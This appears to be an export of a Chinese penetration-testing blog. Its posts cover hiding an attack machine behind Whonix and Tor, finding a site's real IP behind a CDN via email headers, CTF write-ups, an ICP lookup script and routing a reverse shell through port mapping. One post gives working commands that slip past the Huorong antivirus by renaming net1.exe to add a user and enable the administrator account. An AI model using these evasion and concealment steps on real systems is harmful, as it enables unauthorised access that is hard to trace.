    <content><![CDATA[<h1 id="红队隐蔽-whonix-vmware"><a href="#红队隐蔽-whonix-vmware" class="headerlink" title="红队隐蔽 whonix+vmware"></a>红队隐蔽 whonix+vmware</h1><h1 id="whonix"><a href="#whonix" class="headerlink" title="whonix"></a>whonix</h1><p>下载地址 <a href="https://www.t00ls.com/link.html?url=https://www.whonix.org/">https://www.whonix.org/</a></p>
<p><img src="/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/image-20230725185037301.png" alt="image-20230725185037301"></p>
<p>下载后为 Whonix-XFCE-15.0.1.7.3.ova ova 是vbox使用文件，但是本人不使用vbox，所以我们要把他转为vmware得vmdk文件，操作如下： 首先使用压缩软件强行解压，解压后文件如下：</p>
<p><img src="/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/image-20230725185055110.png" alt="image-20230725185055110"></p>
<h1 id="制作vmdk"><a href="#制作vmdk" class="headerlink" title="制作vmdk"></a>制作vmdk</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmware-vdiskmanager.exe -r Whonix-Xfce-17.0.3.0-disk001.vmdk -t 0 Whonix-GW.vmdk</span><br></pre></td></tr></table></figure>

<p>需要在vm的安装目录里面找到vmware-vdiskmanager.exe工具</p>
<p><img src="/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/image-20230725185206447.png" alt="image-20230725185206447"></p>
<h1 id="vmware新建虚拟机"><a href="#vmware新建虚拟机" class="headerlink" title="vmware新建虚拟机"></a>vmware新建虚拟机</h1><p>选新虚拟机的时候先不安装操作系统，到时候直接用磁盘</p>
<p>自定义配置如下： 选择：linux - debian10 x64 - 起名 whonix-GW - 1个处理器 2个内核 - 2g内存 - NAT - 使用现有虚拟磁盘 Whonix-GW.vmdk - 选择转换格式 - 自定义硬件：关闭cd 启动时链接 ；usb、打印机移除 - 添加网卡 - 增加 Lan 区段，起名：whonix</p>
<h1 id="开机-whonix-WG-内配网卡信息，开终端"><a href="#开机-whonix-WG-内配网卡信息，开终端" class="headerlink" title="开机 whonix-WG 内配网卡信息，开终端"></a>开机 whonix-WG 内配网卡信息，开终端</h1><p><img src="/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/image-20230725210701461.png" alt="image-20230725210701461"></p>
<p>在这个里面修改我们的代理设置</p>
<p>打开需要默认密码，默认密码是changeme</p>
<p>在打开的torrc文件的最后面，另起一行，填写如下并保存(加入前置代理哈)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTPSProxy IP:PORT</span><br></pre></td></tr></table></figure>

<img src="/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/一些笔记\渗透测试\红队隐蔽 whonix+vmware\image-20230725211813559.png" alt="image-20230725211813559" style="zoom: 67%;">



<p>然后就是给whonix网关弄两个网卡，一个lan网段，一个nat连外网。</p>
<p>重启之后ifconfig</p>
<p><img src="/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/image-20230725212211170.png" alt="image-20230725212211170"></p>
<h1 id><a href="#" class="headerlink" title></a></h1><p>弄之前需要把nat网卡的地址改成你自的vm工具上面的</p>
<p>/etc/network/interfaces.d/ nano 30_non-qubes-whonix</p>
<p><img src="/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/image-20230725213720726.png" alt="image-20230725213720726"></p>
<p><img src="/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/image-20230726235816120.png" alt="image-20230726235816120"></p>
<p><img src="/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/image-20230725213736504.png" alt="image-20230725213736504"></p>
<p>这里配置一定要注意自己的VMnet网卡配置，包括网关地址以及ip dhcp取值范围（注意这个系统的编辑器用的是nano而不是平时用的vim）</p>
<p><img src="/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/image-20230726235853448.png" alt="image-20230726235853448"></p>
<h1 id="Anon-Connection-Wizard-这里和Tor-浏览器配置一样"><a href="#Anon-Connection-Wizard-这里和Tor-浏览器配置一样" class="headerlink" title="Anon Connection Wizard 这里和Tor 浏览器配置一样"></a>Anon Connection Wizard 这里和Tor 浏览器配置一样</h1><p><img src="/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/image-20230725212544633.png" alt="image-20230725212544633"></p>
<p>你可以用brige也可以用前置代理，当然我们这就用前置代理了，也可以一起用。</p>
<p><img src="/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/image-20230727001359789.png" alt="image-20230727001359789"></p>
<p>等待连上tor网络</p>
<h1 id="配置一下你的攻击机"><a href="#配置一下你的攻击机" class="headerlink" title="配置一下你的攻击机"></a>配置一下你的攻击机</h1><p>攻击机把dns服务器设置成我们的lan网段ip即可</p>
<p>这里我们就是用kali</p>
<p><img src="/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/image-20230727001534028.png" alt="image-20230727001534028"></p>
<p>右键编辑kali 网卡配置</p>
<p><img src="/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/image-20230727001841720.png" alt="image-20230727001841720"></p>
<p>设置成手动（忘截图了）</p>
<p>然后就可以实现匿名了</p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>绕cdn之邮件服务器</title>
    <url>/2024/01/02/%E7%BB%95cdn%E4%B9%8B%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<h1 id="绕cdn之邮件服务器"><a href="#绕cdn之邮件服务器" class="headerlink" title="绕cdn之邮件服务器"></a>绕cdn之邮件服务器</h1><p>平时很少碰到绕cdn的，偶然看到大佬聊天说这个邮件绕cdn的方法很准，所以来学习一下，其实网上也搜得到很多其他的，不过基本上都知道，就只是单独说说邮件服务器的方法。</p>
<p> 考了一年啥也不是咯~</p>
<h1 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h1><p>很多站点都有发送邮件的功能，比如忘记密码，订阅，等等。而且一般的邮件系统很多都是在内部，没有经过CDN的解析。在邮件源码里面就会包含服务器的真实 IP。</p>
<p>现在就以墨者学院为例。<a href="http://www.mozhe.cn/">www.mozhe.cn</a></p>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><p>可以用一些匿名邮箱来，避免被溯源。</p>
<p>现在看看</p>
<p><img src="/2024/01/02/%E7%BB%95cdn%E4%B9%8B%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20240102220050864.png" alt="image-20240102220050864"></p>
<p>一般来说第一个是转发服务器的ip，第二个就是真实服务器的ip。可以结合一些其他的东西进行判断，比如说，对面公司的地址是不是就是在那个ip的地址，</p>
<p>（这么简单个东西还要专门写blog是吧，嘛，主要是记录一下。反正没人看）</p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>绕火绒添加用户</title>
    <url>/2022/10/09/%E7%BB%95%E7%81%AB%E7%BB%92%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/</url>
    <content><![CDATA[<h1 id="绕火绒添加用户"><a href="#绕火绒添加用户" class="headerlink" title="绕火绒添加用户"></a>绕火绒添加用户</h1><p>添加用户的时候，直接使用net命令会被火绒拦截（额截错图了，将就吧）</p>
<p><img src="/2022/10/09/%E7%BB%95%E7%81%AB%E7%BB%92%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/image-20221003113438336.png" alt="image-20221003113438336"></p>
<p>用以下命令即可绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy c:\windows\system32\net1.exe  aaa.txt</span><br><span class="line">aaa.txt user xxx 123456 /add</span><br><span class="line"></span><br><span class="line">aaa.txt user administrator /active:yes #开启administrator用户</span><br></pre></td></tr></table></figure>

<p>注意需要管理员权限，而且此方法不能绕过三六零。</p>
]]></content>
      <categories>
        <category>-miansha</category>
      </categories>
  </entry>
  <entry>
    <title>群友发的签到题 又是一个flag隐藏小技巧</title>
    <url>/2022/01/20/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AAflag%E9%9A%90%E8%97%8F%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h1 id="群友发的签到题-又是一个flag隐藏小技巧"><a href="#群友发的签到题-又是一个flag隐藏小技巧" class="headerlink" title="群友发的签到题 又是一个flag隐藏小技巧"></a>群友发的签到题 又是一个flag隐藏小技巧</h1><p><img src="/2022/01/20/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AAflag%E9%9A%90%E8%97%8F%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20220120221631901.png" alt="image-20220120221631901"></p>
<p>查看源码获得第一个flag</p>
<p><img src="/2022/01/20/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AAflag%E9%9A%90%E8%97%8F%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20220120221658776.png" alt="image-20220120221658776"></p>
<p>这个文件里面有第二个flag</p>
<p><img src="/2022/01/20/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AAflag%E9%9A%90%E8%97%8F%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20220120221736849.png" alt="image-20220120221736849"></p>
<p><img src="/2022/01/20/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AAflag%E9%9A%90%E8%97%8F%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20220120221742130.png" alt="image-20220120221742130"></p>
<p>第三个在robots里面</p>
<p><img src="/2022/01/20/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AAflag%E9%9A%90%E8%97%8F%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20220120221803167.png" alt="image-20220120221803167"></p>
<p>第四个在阿帕奇的配置文件里面</p>
<p><img src="/2022/01/20/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AAflag%E9%9A%90%E8%97%8F%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20220120222056518.png" alt="image-20220120222056518"></p>
<p>最后一个在苹果的备份文件里面</p>
<p><img src="/2022/01/20/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AAflag%E9%9A%90%E8%97%8F%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20220120222130173.png" alt="image-20220120222130173"></p>
<p>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存储目录的自定义属性，例如文件的图标位置或者是背景色的选择。相当于 Windows 下的 desktop.ini。</p>
<p><img src="/2022/01/20/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AAflag%E9%9A%90%E8%97%8F%E5%B0%8F%E6%8A%80%E5%B7%A7/asd.png" alt="img"></p>
<p>٩(๑&gt;◡&lt;๑)۶第一次被叫大佬诶</p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
      <tags>
        <tag>-web</tag>
      </tags>
  </entry>
  <entry>
    <title>群友发的一个题目心得 敏感文件 git泄露 flag的隐藏</title>
    <url>/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/</url>
    <content><![CDATA[<h1 id="群友发的一个题目心得"><a href="#群友发的一个题目心得" class="headerlink" title="群友发的一个题目心得"></a>群友发的一个题目心得</h1><p><a href="http://182.254.215.168:8090/">http://182.254.215.168:8090/</a></p>
<p>打开题目一共有五道题</p>
<p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101160426265.png" alt="image-20220101160426265"></p>
<h2 id="1-第一题"><a href="#1-第一题" class="headerlink" title="1.第一题"></a>1.第一题</h2><p>直接查看源代码，flag就在注释里面</p>
<p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101160729201.png" alt="image-20220101160729201"></p>
<h2 id="2-第二题"><a href="#2-第二题" class="headerlink" title="2.第二题"></a>2.第二题</h2><p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101160832507.png" alt="image-20220101160832507"></p>
<p>打开之后，bp抓包就是这样，才开始我以为是找敏感文件。找了半天没有找到，后来才发现。</p>
<p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101161005749.png" alt="image-20220101161005749"></p>
<p>要从这里开始拦截</p>
<p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101161049259.png" alt="image-20220101161049259"></p>
<p>在返回注释中拿到flag</p>
<h2 id="3-第三题"><a href="#3-第三题" class="headerlink" title="3.第三题"></a>3.第三题</h2><p>第三题点进去是这样<img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101161621911.png" alt="image-20220101161621911"></p>
<p>多半就是xff伪造</p>
<p>在参数中加入X-Forwarded-For: 127.0.0.1</p>
<p>提示<img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101161819908.png" alt="image-20220101161819908"></p>
<p>又在参数中发现</p>
<p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101161833771.png" alt="image-20220101161833771"></p>
<p>将0改为1，试试</p>
<p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101161852223.png" alt="image-20220101161852223"></p>
<p>成功获取flag</p>
<h2 id="4-第四题"><a href="#4-第四题" class="headerlink" title="4.第四题"></a>4.第四题</h2><p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101162229249.png" alt="image-20220101162229249"></p>
<p>都提示是敏感文件了</p>
<p>第一个肯定想到的是robot.txt</p>
<p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101163642673.png" alt="image-20220101163642673"></p>
<p>发现flag的文件，并访问得到flag1？</p>
<p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101163717926.png" alt="image-20220101163717926"></p>
<p>那第二个敏感文件就是gedit备份文件，在index.php地址后面添加~符号，发现要让我们下载，然后txt打开,得到flag2</p>
<p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101164432699.png" alt="image-20220101164432699"></p>
<p>注：  默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；</p>
<p>第三个是vim的临时文件 swp文件</p>
<p><a href="https://blog.csdn.net/weixin_38133867/article/details/78671626">(27条消息) SWP文件详细介绍与利用_James_zjm的博客-CSDN博客_swp文件</a></p>
<p>访问.index.php.swp下载</p>
<p>在虚拟机中用vim打开它</p>
<p>用vim -r  filename复原文件</p>
<p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101183736286.png" alt="image-20220101183736286"></p>
<p>发现第三个flag</p>
<h2 id="5-第五题"><a href="#5-第五题" class="headerlink" title="5.第五题"></a>5.第五题</h2><p>点进去之后发现是</p>
<p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101183857645.png" alt="image-20220101183857645"></p>
<p>这样一个界面，慢慢看。</p>
<p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101184514591.png" alt="image-20220101184514591"></p>
<p>提示我们是git泄露</p>
<p>用githack一弄就弄出来了，没想到这东西只能在py2中运行。</p>
<p><img src="/2022/01/01/%E7%BE%A4%E5%8F%8B%E5%8F%91%E7%9A%84%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-git%E6%B3%84%E9%9C%B2-flag%E7%9A%84%E9%9A%90%E8%97%8F/image-20220101222431174.png" alt="image-20220101222431174"></p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>自动查询icp脚本</title>
    <url>/2022/03/06/%E8%87%AA%E5%8A%A8%E6%9F%A5%E8%AF%A2icp%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="自动查询icp脚本"><a href="#自动查询icp脚本" class="headerlink" title="自动查询icp脚本"></a>自动查询icp脚本</h1><p>这几天收集icp的资源太累了，索性直接写了个脚本</p>
<p>记录一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">method = <span class="built_in">input</span>(<span class="string">&quot;不知道公司名字选1输入官网，知道公司名字选2输入名字&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;https://www.beianx.cn/search/&quot;</span></span><br><span class="line">handers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69&#x27;</span>&#125;</span><br><span class="line"><span class="comment">#先获取IPC中的数据</span></span><br><span class="line"><span class="keyword">if</span> method == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">    website = <span class="built_in">input</span>(<span class="string">&quot;请输入公司的官网的域名，不要子域名不要根域名，直接域名即可可&quot;</span>)</span><br><span class="line">    res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span><span class="subst">&#123;website&#125;</span>&quot;</span>)</span><br><span class="line">    tree = etree.HTML(res.text)</span><br><span class="line">    result = tree.xpath(<span class="string">&quot;/html/body/div[2]/table/tbody/tr/td[2]/a/text()&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(result))</span><br><span class="line"><span class="keyword">elif</span> method == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">    conpany = <span class="built_in">input</span>(<span class="string">&quot;请输入公司的名字&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加载中...&quot;</span>)</span><br><span class="line">    res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span><span class="subst">&#123;conpany&#125;</span>&quot;</span>)</span><br><span class="line">    tree = etree.HTML(res.text)</span><br><span class="line">    result_list = []</span><br><span class="line">    i = <span class="literal">True</span></span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = tree.xpath(<span class="string">f&quot;/html/body/div[2]/table/tbody/tr[<span class="subst">&#123;<span class="built_in">str</span>(index)&#125;</span>]/td[6]/div/a/text()&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> result == []:</span><br><span class="line">                i = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result_list += result</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            i = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;出错了&quot;</span>)</span><br><span class="line">    final = <span class="string">&#x27;\n&#x27;</span>.join(result_list)</span><br><span class="line">    <span class="comment">#选择数据处理的方式</span></span><br><span class="line">    mod = <span class="built_in">input</span>(<span class="string">&quot;请选择：1.直接获取所有的url  2.获取所有非子域名  3.根据hunter domain语法来输出所有的痱子域名&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> mod == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(final)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> mod == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">        final_list2 = []</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> result_list:</span><br><span class="line">            new_item = item.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            <span class="keyword">del</span> new_item[<span class="number">0</span>]</span><br><span class="line">            final_item = <span class="string">&#x27;.&#x27;</span>.join(new_item)</span><br><span class="line">            final_list2.append(final_item)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join(final_list2))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> mod == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">        final_list2 = []</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> result_list:</span><br><span class="line">            new_item = item.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            <span class="keyword">del</span> new_item[<span class="number">0</span>]</span><br><span class="line">            final_item = <span class="string">&#x27;.&#x27;</span>.join(new_item)</span><br><span class="line">            final_list2.append(final_item)</span><br><span class="line"></span><br><span class="line">        resultlist = <span class="built_in">list</span>()</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> final_list2:</span><br><span class="line">            newitem = <span class="string">f&quot;domain=\&quot;<span class="subst">&#123;item&#125;</span>\&quot;&quot;</span></span><br><span class="line">            resultlist.append(newitem)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;||&#x27;</span>.join(resultlist))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;都说了不要乱输东西了，你看是不是又要重新来了嘛&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;给你说了输什么还要乱输是吧？&quot;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-lunzi</category>
      </categories>
  </entry>
  <entry>
    <title>花生壳解决没有公网ip反弹shell</title>
    <url>/2022/11/08/%E8%8A%B1%E7%94%9F%E5%A3%B3%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89%E5%85%AC%E7%BD%91ip%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<h1 id="花生壳解决没有公网ip反弹shell"><a href="#花生壳解决没有公网ip反弹shell" class="headerlink" title="花生壳解决没有公网ip反弹shell"></a>花生壳解决没有公网ip反弹shell</h1><p>首先安装花生壳</p>
<p>点击添加自定义映射</p>
<p><img src="/2022/11/08/%E8%8A%B1%E7%94%9F%E5%A3%B3%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89%E5%85%AC%E7%BD%91ip%E5%8F%8D%E5%BC%B9shell/image-20221108122735113.png" alt="image-20221108122735113"></p>
<p>设置好</p>
<p><img src="/2022/11/08/%E8%8A%B1%E7%94%9F%E5%A3%B3%E8%A7%A3%E5%86%B3%E6%B2%A1%E6%9C%89%E5%85%AC%E7%BD%91ip%E5%8F%8D%E5%BC%B9shell/image-20221108122832925.png" alt="image-20221108122832925"></p>
<p>如果要反弹shell的话，可以选择模板为ssh</p>
<p>内网主机要是是本地的话，就填写127.0.0.1</p>
<p>如果是虚拟机就填写虚拟的本来的内网地址。</p>
<p>设置好之后在本机的软件上开启映射，打开nc的监听，直接把反弹shell弹到花生壳分配的公网ip上面就可以了</p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>谷歌语法</title>
    <url>/2022/01/28/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1 id="谷歌语法"><a href="#谷歌语法" class="headerlink" title="谷歌语法"></a>谷歌语法</h1><p>记录一些常用的谷歌语法</p>
